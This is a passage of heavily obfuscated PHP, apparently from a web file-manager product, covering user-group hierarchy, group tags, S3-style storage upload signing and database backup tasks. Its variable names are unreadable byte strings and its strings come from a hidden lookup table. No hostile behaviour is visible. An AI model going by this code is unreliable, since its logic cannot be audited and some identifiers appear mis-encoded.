$Áˆš·ĞÜ[] = $ÃÎ˜Æìû; foreach ($Áˆš·ĞÜ as $ÃÎ˜Æìû) { if (in_array($ÃÎ˜Æìû . $ºª¨Ãİ[12], $¹¯‘„°†)) { return !0; } } return !1; } private function _listAppendParent(&$‹ş‹±ó«) { $›ù ä¤ı =& $_SERVER[è¶³ÒßÑ]; $‡‚Ê©çÜ = array(); foreach ($‹ş‹±ó« as &$ÚÜ’Í®•) { $‡‚Ê©çÜ[$ÚÜ’Í®•[$›ù ä¤ı[1959]]] = $ÚÜ’Í®•[$›ù ä¤ı[32]]; $ÔëÃŸØå = $this->parentLevelArray($ÚÜ’Í®•[$›ù ä¤ı[577]]); foreach ($ÔëÃŸØå as $öö´”êş) { if (!isset($‡‚Ê©çÜ[$öö´”êş])) { $‡‚Ê©çÜ[$öö´”êş] = 0; } } } unset($ÚÜ’Í®•); foreach ($‡‚Ê©çÜ as $•Š¢÷Í² => $±ˆõ“Ù) { if ($±ˆõ“Ù) { continue; } $¯å‰ëı… = $this->getInfoSimple($•Š¢÷Í²); $‡‚Ê©çÜ[$•Š¢÷Í²] = $¯å‰ëı…[$›ù ä¤ı[32]]; } $²èç÷‘ = $GLOBALS[$›ù ä¤ı[6]][$›ù ä¤ı[102]][$›ù ä¤ı[2066]]; if (KodUser::isRoot()) { $²èç÷‘ = !1; } foreach ($‹ş‹±ó« as &$ÚÜ’Í®•) { $ÔëÃŸØå = $this->parentLevelArray($ÚÜ’Í®•[$›ù ä¤ı[577]]); $ßŒª†·¹ = $›ù ä¤ı[12]; foreach ($ÔëÃŸØå as $•Š¢÷Í² => $öö´”êş) { if ($²èç÷‘ && $•Š¢÷Í² == 0) { continue; } $ßŒª†·¹ .= $‡‚Ê©çÜ[$öö´”êş] . $›ù ä¤ı[8]; } if ($ÔëÃŸØå) { $ßŒª†·¹ .= $ÚÜ’Í®•[$›ù ä¤ı[32]]; } $ÚÜ’Í®•[$›ù ä¤ı[582]] = str_replace($›ù ä¤ı[585], $›ù ä¤ı[8], $ßŒª†·¹); } unset($ÚÜ’Í®•); } private function _listAppendSourceRoot(&$Ïò’…İ, $è¡ø§•“) { $åêÆ£ß¢ =& $_SERVER[è¶³ÒßÑ]; $È­éÑªí = Model($åêÆ£ß¢[878])->listSourceRoot(SourceModel::TYPE_GROUP, $è¡ø§•“); $È­éÑªí = array_to_keyvalue($È­éÑªí, $åêÆ£ß¢[562]); $È­éÑªí = array_remove_key($È­éÑªí, $åêÆ£ß¢[562]); foreach ($Ïò’…İ as &$‚”Ëü­×) { $‚”Ëü­×[$åêÆ£ß¢[100]] = $È­éÑªí[$‚”Ëü­×[$åêÆ£ß¢[1959]]] ? $È­éÑªí[$‚”Ëü­×[$åêÆ£ß¢[1959]]] : array(); } unset($‚”Ëü­×); } protected function groupMerge($˜îøíğ­) { $˜îøíğ­ = array_values(array_unique($˜îøíğ­)); $Ç Èëê™ = array(); for ($¸†Îî¸ë = 0; $¸†Îî¸ë < count($˜îøíğ­); $¸†Îî¸ë++) { $–ƒ¾µáö = !1; for ($¿ı×¬ı = 0; $¿ı×¬ı < count($˜îøíğ­); $¿ı×¬ı++) { if ($¸†Îî¸ë == $¿ı×¬ı) { continue; } if ($this->isParentOf($˜îøíğ­[$¿ı×¬ı], $˜îøíğ­[$¸†Îî¸ë])) { $–ƒ¾µáö = !0; break; } } if (!$–ƒ¾µáö) { $Ç Èëê™[] = $˜îøíğ­[$¸†Îî¸ë]; } } return $Ç Èëê™; } protected function isParentOf($Ä‰Ç‰‚†, $½®şÇŠ) { $£”Ô™Ì =& $_SERVER[è¶³ÒßÑ]; if (!$Ä‰Ç‰‚† || !$½®şÇŠ || $Ä‰Ç‰‚† == $½®şÇŠ) { return !1; } $šñö§ñ˜ = $this->getInfoSimple($Ä‰Ç‰‚†); $£ÌƒûÁÊ = $this->getInfoSimple($½®şÇŠ); $Ï‰š³Ú¤ = $šñö§ñ˜[$£”Ô™Ì[577]] . $Ä‰Ç‰‚† . $£”Ô™Ì[50]; if (substr($£ÌƒûÁÊ[$£”Ô™Ì[577]], 0, strlen($Ï‰š³Ú¤)) == $Ï‰š³Ú¤) { return !0; } return !1; } public function groupShowRoot($Úğ½ßœ, $Œû²²¯ = false) { $ñÏé£ó± =& $_SERVER[è¶³ÒßÑ]; $ã‹³Ö¢Ü = $this->getInfo($Úğ½ßœ); if (!$ã‹³Ö¢Ü) { return array(); } $èú½´ä± = $this->parentLevelArray($ã‹³Ö¢Ü[$ñÏé£ó±[577]]); $”¥–ŸÚ¬ = array($Úğ½ßœ); if (count($èú½´ä±) == 0) { return $”¥–ŸÚ¬; } if ($Œû²²¯ && count($èú½´ä±) == 1) { return $”¥–ŸÚ¬; } if (!$ã‹³Ö¢Ü[$ñÏé£ó±[532]] || !isset($ã‹³Ö¢Ü[$ñÏé£ó±[532]][$ñÏé£ó±[2049]]) || $ã‹³Ö¢Ü[$ñÏé£ó±[532]][$ñÏé£ó±[2049]] == $ñÏé£ó±[830]) { return $this->groupShowRoot($èú½´ä±[count($èú½´ä±) - 1], $Œû²²¯); } if ($ã‹³Ö¢Ü[$ñÏé£ó±[532]][$ñÏé£ó±[2049]] == $ñÏé£ó±[426]) { $å’ù›‹› = explode($ñÏé£ó±[50], $ã‹³Ö¢Ü[$ñÏé£ó±[532]][$ñÏé£ó±[2050]]); if ($å’ù›‹›) { $”¥–ŸÚ¬ = array_merge($”¥–ŸÚ¬, $å’ù›‹›); } } return $”¥–ŸÚ¬; } protected function resetParentLevel() { $ñ¿¹¦½ù =& $_SERVER[è¶³ÒßÑ]; $‡Â²è ‹ = $ñ¿¹¦½ù[1959]; $¾’€±ÇÒ = $this->select(); $¾’€±ÇÒ = array_to_keyvalue($¾’€±ÇÒ, $‡Â²è ‹); foreach ($¾’€±ÇÒ as $¹˜¾¤å) { $Â‡Ê±â– = $¹˜¾¤å; $•÷Ôµ¨ = array(); while ($Â‡Ê±â–[$ñ¿¹¦½ù[202]] != 0) { $•÷Ôµ¨[] = $Â‡Ê±â–[$ñ¿¹¦½ù[202]]; $Â‡Ê±â– = $¾’€±ÇÒ[$Â‡Ê±â–[$ñ¿¹¦½ù[202]]]; } $•÷Ôµ¨[] = 0; $•÷Ôµ¨ = $ñ¿¹¦½ù[50] . implode($ñ¿¹¦½ù[50], array_reverse($•÷Ôµ¨)) . $ñ¿¹¦½ù[50]; $this->setNamePinyin($¹˜¾¤å[$‡Â²è ‹], $¹˜¾¤å[$ñ¿¹¦½ù[32]]); $this->where(array($‡Â²è ‹ => $¹˜¾¤å[$‡Â²è ‹]))->save(array($ñ¿¹¦½ù[645] => $•÷Ôµ¨)); } return $¾’€±ÇÒ; } public function groupNameAuto($–ÈÈÆ›ß, $³²â†Ò) { $ÇË­¬áÈ =& $_SERVER[è¶³ÒßÑ]; $€ı×‹¨ï = $this->where(array($ÇË­¬áÈ[470] => $–ÈÈÆ›ß))->getField($ÇË­¬áÈ[32], !0); if (!$€ı×‹¨ï || !in_array($³²â†Ò, $€ı×‹¨ï)) { return $³²â†Ò; } for ($ˆÈßÎÉ = 1; $ˆÈßÎÉ <= count($€ı×‹¨ï) + 1; $ˆÈßÎÉ++) { $´‘í‚¸î = $³²â†Ò . "\50{$ˆÈßÎÉ}\x29"; if (!in_array($´‘í‚¸î, $€ı×‹¨ï)) { return $´‘í‚¸î; } } } public function groupSwitch($óÖ£—ÚÔ, $ı‚¹ïÑ²) { $¦Ğ·Ñ¼â =& $_SERVER[è¶³ÒßÑ]; $ëÉä«²Ñ = array($¦Ğ·Ñ¼â[1959] => array($¦Ğ·Ñ¼â[7], array($óÖ£—ÚÔ, $ı‚¹ïÑ²))); $ÚÄ†“¨ = $this->where($ëÉä«²Ñ)->select(); $ÚÄ†“¨ = array_to_keyvalue($ÚÄ†“¨, $¦Ğ·Ñ¼â[1959]); if (!isset($ÚÄ†“¨[$óÖ£—ÚÔ]) || !isset($ÚÄ†“¨[$ı‚¹ïÑ²]) || $ÚÄ†“¨[$óÖ£—ÚÔ][$¦Ğ·Ñ¼â[202]] == 0) { return !1; } $ëÉä«²Ñ = array($¦Ğ·Ñ¼â[1959] => $óÖ£—ÚÔ); $è«ˆ±Ïô = Model($¦Ğ·Ñ¼â[2053])->where($ëÉä«²Ñ)->select(); if (!$è«ˆ±Ïô) { $è«ˆ±Ïô = array(); } foreach ($è«ˆ±Ïô as $ğæ¨‡ê‚) { $ã¤áâŠ¿ = $ğæ¨‡ê‚[$¦Ğ·Ñ¼â[1761]]; $ëÉä«²Ñ = array($¦Ğ·Ñ¼â[1761] => $ã¤áâŠ¿, $¦Ğ·Ñ¼â[1959] => $ı‚¹ïÑ²); $¾“ùöƒ• = Model($¦Ğ·Ñ¼â[2053])->where($ëÉä«²Ñ)->find(); if (!$¾“ùöƒ•) { $ûêµ‰¤ = array($ı‚¹ïÑ² => $ğæ¨‡ê‚[$¦Ğ·Ñ¼â[2067]]); Model($¦Ğ·Ñ¼â[591])->userGroupAdd($ã¤áâŠ¿, $ûêµ‰¤); } Model($¦Ğ·Ñ¼â[591])->userGroupRemove($ã¤áâŠ¿, $óÖ£—ÚÔ); } $ëÉä«²Ñ = array($¦Ğ·Ñ¼â[200] => 2, $¦Ğ·Ñ¼â[202] => 0, $¦Ğ·Ñ¼â[478] => 1, $¦Ğ·Ñ¼â[562] => array($¦Ğ·Ñ¼â[7], array($óÖ£—ÚÔ, $ı‚¹ïÑ²))); $Í³±ó“² = Model($¦Ğ·Ñ¼â[878])->where($ëÉä«²Ñ)->field($¦Ğ·Ñ¼â[2068])->select(); $Í³±ó“² = array_to_keyvalue($Í³±ó“², $¦Ğ·Ñ¼â[562], $¦Ğ·Ñ¼â[203]); $ü€»–Úç = !empty($Í³±ó“²[$óÖ£—ÚÔ]) ? $Í³±ó“²[$óÖ£—ÚÔ] : !1; if ($ü€»–Úç) { if (!$Í³±ó“²[$ı‚¹ïÑ²]) { $Í³±ó“²[$ı‚¹ïÑ²] = Model($¦Ğ·Ñ¼â[878])->groupRootAdd($ı‚¹ïÑ²); } $³¥ìğ› = $Í³±ó“²[$ı‚¹ïÑ²]; $ëÉä«²Ñ = array($¦Ğ·Ñ¼â[202] => $ü€»–Úç); $Í³±ó“² = Model($¦Ğ·Ñ¼â[878])->where($ëÉä«²Ñ)->field($¦Ğ·Ñ¼â[2069])->select(); if (!$Í³±ó“²) { $Í³±ó“² = array(); } Model($¦Ğ·Ñ¼â[878])->moveClearAuth = !1; foreach ($Í³±ó“² as $ƒ»ÌÊš) { $ÓÄ×ÑÈŞ = $ƒ»ÌÊš[$¦Ğ·Ñ¼â[478]] == $¦Ğ·Ñ¼â[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¦Ğ·Ñ¼â[878])->move($ƒ»ÌÊš[$¦Ğ·Ñ¼â[203]], $³¥ìğ›, $ÓÄ×ÑÈŞ); } Model($¦Ğ·Ñ¼â[878])->moveClearAuth = !0; $ëÉä«²Ñ = array($¦Ğ·Ñ¼â[200] => 2, $¦Ğ·Ñ¼â[562] => $óÖ£—ÚÔ); $‹œÈ† = array($¦Ğ·Ñ¼â[562] => $ı‚¹ïÑ²); Model($¦Ğ·Ñ¼â[2070])->where($ëÉä«²Ñ)->save($‹œÈ†); Model($¦Ğ·Ñ¼â[2071])->where($ëÉä«²Ñ)->save($‹œÈ†); } $this->_changeChildLevel($ÚÄ†“¨[$óÖ£—ÚÔ], $ÚÄ†“¨[$ı‚¹ïÑ²], !0); $this->where(array($¦Ğ·Ñ¼â[202] => $óÖ£—ÚÔ))->save(array($¦Ğ·Ñ¼â[202] => $ı‚¹ïÑ²)); $this->_clearChildrenCache($ÚÄ†“¨[$ı‚¹ïÑ²]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\141\166"; protected function cacheFunctionAlias($Í÷ªøá) { $Ú¦Ï÷ê =& $_SERVER[è¶³ÒßÑ]; return array($Ú¦Ï÷ê[2072] => array($Í÷ªøá[0], $Ú¦Ï÷ê[2073]), $Ú¦Ï÷ê[2074] => array($Í÷ªøá[0], $Ú¦Ï÷ê[2075])); } protected function get($ß“øºà) { $Ü‹®¦‘† =& $_SERVER[è¶³ÒßÑ]; $¬¿ûç¡ı = Model($Ü‹®¦‘†[578])->metaGet($ß“øºà, $Ü‹®¦‘†[2076]); $½Ò€™„ = json_decode($¬¿ûç¡ı, !0); return $½Ò€™„ ? $½Ò€™„ : array($Ü‹®¦‘†[2077] => $Ü‹®¦‘†[101], $Ü‹®¦‘†[438] => array()); } protected function set($ÜÛÈœ¹­, $Ä½Êı»ò) { $µòÊŸ¿Ç =& $_SERVER[è¶³ÒßÑ]; $Ä½Êı»ò = $Ä½Êı»ò ? $Ä½Êı»ò : array($µòÊŸ¿Ç[2077] => $µòÊŸ¿Ç[101], $µòÊŸ¿Ç[438] => array()); return Model($µòÊŸ¿Ç[578])->metaSet($ÜÛÈœ¹­, $µòÊŸ¿Ç[2076], json_encode($Ä½Êı»ò)); } protected function getByTagID($êå©°Õ§, $‡´Û„Øª) { $Ì¥Ôøì» =& $_SERVER[è¶³ÒßÑ]; if (!$êå©°Õ§ || !$‡´Û„Øª) { return !1; } if (!Model($Ì¥Ôøì»[578])->getInfoSimple($êå©°Õ§)) { return !1; } $›Å„ß¼ = $this->get($êå©°Õ§); if (!$›Å„ß¼ || !isset($›Å„ß¼[$Ì¥Ôøì»[438]])) { return !1; } $¼´ˆ´Ã¸ = array_find_by_field($›Å„ß¼[$Ì¥Ôøì»[438]], $Ì¥Ôøì»[468], $‡´Û„Øª); return is_array($¼´ˆ´Ã¸) ? $¼´ˆ´Ã¸ : !1; } public function listSource($Éã§¥÷, $ €ŠÜÄí) { $²ò‘æù’ =& $_SERVER[è¶³ÒßÑ]; if ($ €ŠÜÄí && !is_array($ €ŠÜÄí)) { $ €ŠÜÄí = array($ €ŠÜÄí); } $ —‚§äÜ = $this->listData($Éã§¥÷); $Ö»ˆ©²± = array(); foreach ($ —‚§äÜ as $Á²™¥Á») { $šíŠ½İ‡ = $Á²™¥Á»[$²ò‘æù’[97]]; if (!$šíŠ½İ‡) { continue; } if (!isset($Ö»ˆ©²±[$šíŠ½İ‡])) { $Ö»ˆ©²±[$šíŠ½İ‡] = array(); } $Ö»ˆ©²±[$šíŠ½İ‡][] = $Á²™¥Á»[$²ò‘æù’[493]]; } $·öœ‘Ó› = array(); foreach ($Ö»ˆ©²± as $Î©¢æÒ¨ => $±Èœ…–â) { $Ş¤›“¤Ô = !0; if (!$ €ŠÜÄí) { $·öœ‘Ó›[] = $Î©¢æÒ¨; continue; } foreach ($ €ŠÜÄí as $…ÀèŒ) { if (!in_array($…ÀèŒ, $±Èœ…–â)) { $Ş¤›“¤Ô = !1; break; } } if ($Ş¤›“¤Ô) { $·öœ‘Ó›[] = $Î©¢æÒ¨; } } if (!$·öœ‘Ó›) { return array(); } $‰Íşé©Ø = array($²ò‘æù’[484] => array($²ò‘æù’[485], $·öœ‘Ó›), $²ò‘æù’[562] => $Éã§¥÷, $²ò‘æù’[200] => SourceModel::TYPE_GROUP); $´·àœ½ = Model($²ò‘æù’[1395])->listSource($‰Íşé©Ø); if (!$´·àœ½ || count($·öœ‘Ó›) == $´·àœ½[$²ò‘æù’[435]][$²ò‘æù’[436]]) { return $´·àœ½; } $ÑÉŞªÂ§ = array(); $¸Û×£Áƒ = array_to_keyvalue($´·àœ½[$²ò‘æù’[95]], $²ò‘æù’[12], $²ò‘æù’[203]); $©ŒŠ€©– = array_to_keyvalue($´·àœ½[$²ò‘æù’[96]], $²ò‘æù’[12], $²ò‘æù’[203]); $€šŸ‘æ÷ = array_merge($©ŒŠ€©–, $¸Û×£Áƒ); foreach ($·öœ‘Ó› as $šíŠ½İ‡) { if (!in_array($šíŠ½İ‡, $€šŸ‘æ÷)) { $ÑÉŞªÂ§[] = $šíŠ½İ‡; } } if ($ÑÉŞªÂ§) { $this->removeBySource($Éã§¥÷, $ÑÉŞªÂ§); } return $´·àœ½; } protected function listData($éœ·†°’) { $“®•µ½“ =& $_SERVER[è¶³ÒßÑ]; $—‰Šêöö = array($“®•µ½“[1752] => 0, $“®•µ½“[550] => array($“®•µ½“[2078], 0), $“®•µ½“[489] => $“®•µ½“[2079] . $éœ·†°’); $íÔ—ŠÃâ = $“®•µ½“[2080]; $¨òÀ™°Û = $this->field($íÔ—ŠÃâ)->where($—‰Šêöö)->order($“®•µ½“[2081])->select(); return $¨òÀ™°Û ? $¨òÀ™°Û : array(); } protected function addToTag($àÆ¦Òºú, $Š¼îÉÓ, $¬¥£Ë²í) { $·‚±î“› =& $_SERVER[è¶³ÒßÑ]; if (!$this->getByTagID($àÆ¦Òºú, $¬¥£Ë²í) || !$Š¼îÉÓ) { return !1; } if (!Model($·‚±î“›[878])->pathInfo($Š¼îÉÓ)) { return !1; } $÷í˜­¡ = array($·‚±î“›[1752] => 0, $·‚±î“›[550] => $¬¥£Ë²í, $·‚±î“›[488] => $Š¼îÉÓ, $·‚±î“›[489] => $·‚±î“›[2082] . $àÆ¦Òºú, $·‚±î“›[487] => $·‚±î“›[12], $·‚±î“›[1963] => 0); if ($this->where($÷í˜­¡)->find()) { return !1; } return $this->add($÷í˜­¡); } protected function removeFromTag($Œ›µĞÖŒ, $İìÃ¯€, $¶ê“„Ä‚) { $’——Å­Ø =& $_SERVER[è¶³ÒßÑ]; if (!$this->getByTagID($Œ›µĞÖŒ, $¶ê“„Ä‚) || !$İìÃ¯€) { return !1; } if (is_array($İìÃ¯€)) { $İìÃ¯€ = array($’——Å­Ø[7], $İìÃ¯€); } $¶ª¿¼Æ€ = array($’——Å­Ø[1752] => 0, $’——Å­Ø[550] => $¶ê“„Ä‚, $’——Å­Ø[489] => $’——Å­Ø[2082] . $Œ›µĞÖŒ, $’——Å­Ø[488] => $İìÃ¯€); return $this->where($¶ª¿¼Æ€)->delete(); } protected function removeByTag($öŠ—ş±½, $ƒşâûã›) { $›‡Ù™êà =& $_SERVER[è¶³ÒßÑ]; if (!$this->getByTagID($öŠ—ş±½, $ƒşâûã›)) { return !1; } $“©¨Ş¼ = array($›‡Ù™êà[1752] => 0, $›‡Ù™êà[550] => $ƒşâûã›, $›‡Ù™êà[489] => $›‡Ù™êà[2082] . $öŠ—ş±½); return $this->where($“©¨Ş¼)->delete(); } protected function removeBySource($È—¦ÓÊĞ, $­È ¾) { $ÎÒ®šä· =& $_SERVER[è¶³ÒßÑ]; if (!$È—¦ÓÊĞ || !$­È ¾) { return !1; } if (is_array($­È ¾)) { $­È ¾ = array($ÎÒ®šä·[7], $­È ¾); } $‰ÙÎÊƒÉ = array($ÎÒ®šä·[1752] => 0, $ÎÒ®šä·[488] => $­È ¾, $ÎÒ®šä·[550] => array($ÎÒ®šä·[1067], 0), $ÎÒ®šä·[489] => $ÎÒ®šä·[2082] . $È—¦ÓÊĞ); return $this->where($‰ÙÎÊƒÉ)->delete(); } } goto E¢™ŠáÙİÌ; d„¶ÌîŒÒ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($æ‚µÛ’) { $this->pathParse = $æ‚µÛ’; } protected function infoParse($å‡Ö©†®, $èÎÈ²¤Ô = false) { $Ş¾ğÔÅ… =& $_SERVER[è¶³ÒßÑ]; return Action($Ş¾ğÔÅ…[1231])->sharePathInfo($this->pathParse[$Ş¾ğÔÅ…[97]], !0, $èÎÈ²¤Ô); } public function listPath($‡‹ğ†‰, $–ÀÑ’˜ = false) { $•‡‘¬¦â =& $_SERVER[è¶³ÒßÑ]; $ÆØÌõÈŞ = IO::listPath($‡‹ğ†‰, $–ÀÑ’˜); if (!$ÆØÌõÈŞ) { return $ÆØÌõÈŞ; } if (is_array($ÆØÌõÈŞ[$•‡‘¬¦â[1403]])) { $şË”•¾¦ = Action($•‡‘¬¦â[1412])->parsePathChildren($ÆØÌõÈŞ[$•‡‘¬¦â[1403]], array($•‡‘¬¦â[488] => $‡‹ğ†‰)); $ÆØÌõÈŞ[$•‡‘¬¦â[1403]] = Action($•‡‘¬¦â[1231])->shareItemInfo($şË”•¾¦); } foreach ($ÆØÌõÈŞ as $šğÕ—Œ => $šõ²×) { if (!in_array($šğÕ—Œ, array($•‡‘¬¦â[96], $•‡‘¬¦â[95]))) { continue; } foreach ($šõ²× as $ñüÔıãí => $şË”•¾¦) { $şË”•¾¦ = Action($•‡‘¬¦â[1412])->parsePathChildren($şË”•¾¦, array($•‡‘¬¦â[488] => $‡‹ğ†‰)); $ÆØÌõÈŞ[$šğÕ—Œ][$ñüÔıãí] = Action($•‡‘¬¦â[1231])->shareItemInfo($şË”•¾¦); } } return $ÆØÌõÈŞ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Ñ‚©Û¾) { parent::__construct($Ñ‚©Û¾); $this->setSignVersion($_SERVER[è¶³ÒßÑ][257]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($”ßò ¥) { parent::__construct($”ßò ¥); $this->setSignVersion($_SERVER[è¶³ÒßÑ][257]); } public function uploadFormData($¶ÄÑ¼ğ, $ãõ§Ä „ = 3600) { $­©öşÈ =& $_SERVER[è¶³ÒßÑ]; $§¯Ã×‡ = $­©öşÈ[239]; $”Õñ‘é¢ = $­©öşÈ[279]; $”èèá¥€ = $­©öşÈ[72]; $¯¸™‘Şí = gmdate($­©öşÈ[280]); $Úü•€Œê = gmdate($­©öşÈ[281]); $á¯ì°÷œ = $­©öşÈ[282]; $ö¦Ş±Ä = $ãõ§Ä „ . $­©öşÈ[12]; $µ‡ÚÚŞ‰ = $­©öşÈ[283]; $¥¼¥¡Ÿ = array($this->accessKey, $Úü•€Œê, $this->region, $”èèá¥€, $á¯ì°÷œ); $¹öÉ¨òä = implode($­©öşÈ[8], $¥¼¥¡Ÿ); $æ”€À¯† = array($­©öşÈ[284] => gmdate($­©öşÈ[1387], strtotime($­©öşÈ[286])), $­©öşÈ[287] => array(array($­©öşÈ[288] => $this->bucket), array($­©öşÈ[289] => $§¯Ã×‡), array($­©öşÈ[290], $­©öşÈ[291], $­©öşÈ[12]), array($­©öşÈ[290], $­©öşÈ[292], $­©öşÈ[12]), array($­©öşÈ[290], $­©öşÈ[293], $­©öşÈ[12]), array($­©öşÈ[294] => $µ‡ÚÚŞ‰), array($­©öşÈ[295] => $¹öÉ¨òä), array($­©öşÈ[296] => $”Õñ‘é¢), array($­©öşÈ[297] => $¯¸™‘Şí), array($­©öşÈ[298] => $ö¦Ş±Ä))); $ü‰˜óçÔ = base64_encode(json_encode($æ”€À¯†)); $¯×¨ìüó = hash_hmac($­©öşÈ[299], $Úü•€Œê, $­©öşÈ[300] . $this->secret, !0); $åòì›²ç = hash_hmac($­©öşÈ[299], $this->region, $¯×¨ìüó, !0); $ë œş–‰ = hash_hmac($­©öşÈ[299], $”èèá¥€, $åòì›²ç, !0); $î“‚‹ÓÑ = hash_hmac($­©öşÈ[299], $á¯ì°÷œ, $ë œş–‰, !0); $’Ãë”ñ— = hash_hmac($­©öşÈ[299], $ü‰˜óçÔ, $î“‚‹ÓÑ); $ù¨ì³ãî = array($­©öşÈ[256] => $­©öşÈ[12], $­©öşÈ[301] => $­©öşÈ[12], $­©öşÈ[289] => $§¯Ã×‡, $­©öşÈ[294] => $µ‡ÚÚŞ‰, $­©öşÈ[302] => $ü‰˜óçÔ, $­©öşÈ[303] => $¹öÉ¨òä, $­©öşÈ[304] => $”Õñ‘é¢, $­©öşÈ[305] => $¯¸™‘Şí, $­©öşÈ[306] => $ö¦Ş±Ä, $­©öşÈ[307] => $’Ãë”ñ—, $­©öşÈ[218] => $this->getHost()); return $ù¨ì³ãî; } } goto Aí‡öÈ·¨Ÿ; BÄßššõ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x62\x61\143\153\x75\160\114\151\x73\164"; public $field = array("\151\x6f", "\156\141\155\x65", "\x73\164\141\164\165\x73", "\x63\157\x6e\x74\x65\156\x74", "\x6d\141\x6e\x75\x61\154", "\x72\x65\x73\165\154\x74", "\x74\151\155\x65\x46\162\157\x6d", "\x74\151\155\145\x54\157"); public function config() { $­¹ëê÷ =& $_SERVER[è¶³ÒßÑ]; $²‘   = Model($­¹ëê÷[824])->get($­¹ëê÷[837]); $²‘   = json_decode($²‘  , !0); $²‘   = is_array($²‘  ) ? $²‘   : array(); $this->parseContent($²‘  ); unset($²‘  [$­¹ëê÷[1731]]); Action($­¹ëê÷[1984])->taskInit(); Model($­¹ëê÷[1730])->cacheClear(); $¸ÌÖçíÇ = $­¹ëê÷[1985]; $ÀÇµÆ±ğ = Model($­¹ëê÷[1986])->findByKey($­¹ëê÷[1749], $¸ÌÖçíÇ); if (!$ÀÇµÆ±ğ) { $ÀÇµÆ±ğ = array(); } if (isset($ÀÇµÆ±ğ[$­¹ëê÷[216]])) { $ÀÇµÆ±ğ[$­¹ëê÷[216]] = json_decode($ÀÇµÆ±ğ[$­¹ëê÷[216]], !0); } if (isset($²‘  [$­¹ëê÷[216]])) { $ÀÇµÆ±ğ[$­¹ëê÷[216]][$­¹ëê÷[1734]] = $²‘  [$­¹ëê÷[216]]; unset($²‘  [$­¹ëê÷[216]]); } return array_merge($ÀÇµÆ±ğ, $²‘  ); } public function listData($ıŸÃÂ’ = false, $Ùà—ë = "\x6d\157\x64\151\146\171\x54\151\x6d\x65", $‹¶¬Ÿ¯± = false) { $‹–áß–‚ = parent::listData($ıŸÃÂ’, $Ùà—ë, !0); if (!$‹–áß–‚) { return $‹–áß–‚; } if ($ıŸÃÂ’) { $‹–áß–‚ = array($‹–áß–‚); } foreach ($‹–áß–‚ as &$è¯ÍˆŠ·) { $this->parseContent($è¯ÍˆŠ·); } return $ıŸÃÂ’ ? $‹–áß–‚[0] : $‹–áß–‚; } public function parseContent(&$ªôÇüê¼) { $óÓ“ğ¶ˆ =& $_SERVER[è¶³ÒßÑ]; if (!$ªôÇüê¼) { return; } $ê®Šù€ = _get($ªôÇüê¼, $óÓ“ğ¶ˆ[181], $óÓ“ğ¶ˆ[101]); if (!in_array($ê®Šù€, array($óÓ“ğ¶ˆ[830], $óÓ“ğ¶ˆ[1186]))) { $ªôÇüê¼[$óÓ“ğ¶ˆ[181]] = $ê®Šù€ == $óÓ“ğ¶ˆ[101] ? $óÓ“ğ¶ˆ[1186] : $óÓ“ğ¶ˆ[830]; } } public function lastItem() { $¦„Í’é = $this->listData(); return !empty($¦„Í’é[0]) ? $¦„Í’é[0] : null; } public function kill($ïª‡¤„Ÿ) { $¯Ùú±´ =& $_SERVER[è¶³ÒßÑ]; $ª¸´âÀ¬ = $this->listData($ïª‡¤„Ÿ); if (!$ª¸´âÀ¬ || empty($ª¸´âÀ¬[$¯Ùú±´[32]])) { return !0; } Task::kill($¯Ùú±´[836]); Task::kill($¯Ùú±´[854]); Task::kill($¯Ùú±´[863]); $Ñä¾ƒ—… = $ª¸´âÀ¬[$¯Ùú±´[32]]; $•´´˜äã = TEMP_FILES . $¯Ùú±´[833] . $Ñä¾ƒ—… . $¯Ùú±´[8]; IO::remove($•´´˜äã, !1); return $this->remove($ïª‡¤„Ÿ); } public function remove($ããŒ±ˆ…) { $ü²†²õ© = $this->listData($ããŒ±ˆ…); if (!$ü²†²õ©) { return !0; } return $this->backupRemove($ü²†²õ©); } private function backupRemove($­Ûó—’¥) { parent::remove($­Ûó—’¥[$_SERVER[è¶³ÒßÑ][468]]); $î¤Ë”¢® = $this->backupPath($­Ûó—’¥); IO::remove($î¤Ë”¢®, !1); return !0; } private function backupPath($²ã¤ÊÎá) { $Û„á£ó =& $_SERVER[è¶³ÒßÑ]; $õí§şèƒ = $²ã¤ÊÎá[$Û„á£ó[32]]; $ãÏáÏÑÜ = Model($Û„á£ó[824])->get($Û„á£ó[825]); $ş»ú†ñª = substr(md5($Û„á£ó[826] . $ãÏáÏÑÜ . $õí§şèƒ), 0, 8); return "\173\x69\x6f\x3a{$²ã¤ÊÎá[$Û„á£ó[806]]}\x7d\x2f\x64\x61\164\x61\142\x61\163\145\x2f\x62\141\143\x6b\x75\x70\57" . $õí§şèƒ . $Û„á£ó[11] . $ş»ú†ñª; } public function start() { $š…šßä =& $_SERVER[è¶³ÒßÑ]; if ($GLOBALS[$š…šßä[6]][$š…šßä[102]][$š…šßä[1987]] != $š…šßä[101]) { return !0; } $³‚éúª = $this->config(); if (!$³‚éúª || $³‚éúª[$š…šßä[1731]] != $š…šßä[101]) { return !1; } $ƒè†÷Á = $this->process(); foreach ($ƒè†÷Á as $È¦ã²ö) { if ($È¦ã²ö) { return Task::restart($È¦ã²ö[$š…šßä[468]]); } } $ìãÚ‡¬è = new Backup(); $Û¿Šâ¨Ç = $ìãÚ‡¬è->db(); if ($Û¿Šâ¨Ç) { $Û¿Šâ¨Ç = $ìãÚ‡¬è->dbFile(); if ($Û¿Šâ¨Ç && $³‚éúª[$š…šßä[181]] == $š…šßä[830]) { $Û¿Šâ¨Ç = $ìãÚ‡¬è->file(); } } Backup::set(array($š…šßä[804] => 1, $š…šßä[815] => time())); return !0; } public function process() { $şüåõôĞ =& $_SERVER[è¶³ÒßÑ]; $Ò±±îûÒ = array($şüåõôĞ[811] => Task::get($şüåõôĞ[836]), $şüåõôĞ[816] => Task::get($şüåõôĞ[854]), $şüåõôĞ[240] => Task::get($şüåõôĞ[863])); $×û£êø¿ = !1; foreach ($Ò±±îûÒ as &$Ó¥ÈÄ‹») { if ($×û£êø¿) { $Ó¥ÈÄ‹» = !1; continue; } if ($Ó¥ÈÄ‹») { $†ëÊ—ìÓ = intval(_get($Ó¥ÈÄ‹», $şüåõôĞ[1766], 0)); if (time() - $†ëÊ—ìÓ > 7200) { 